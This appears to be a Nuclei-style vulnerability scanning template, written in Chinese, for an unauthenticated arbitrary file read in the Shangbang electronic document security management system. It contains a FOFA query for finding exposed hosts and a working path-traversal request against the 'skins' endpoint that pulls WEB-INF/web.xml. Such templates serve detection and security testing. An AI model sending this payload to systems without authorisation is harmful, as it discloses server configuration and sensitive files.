id: shangbang-skins-File-reading

info:
  tags: shangbang-skins-File-reading
  name: 上邦 电子文档安全管理系统 skins 任意文件读取漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="上邦-电子文档安全管理系统"
    上邦 电子文档安全管理系统 skins 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
http:
  - raw:
      - |
        GET /docsafe/sc/skins/..%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'http://java.sun.com'
          - '<web-app'
          - '</web-app>'
          - '<servlet>'
          - '</servlet>'
        condition: and
      - type: status
        status: 
          - 200
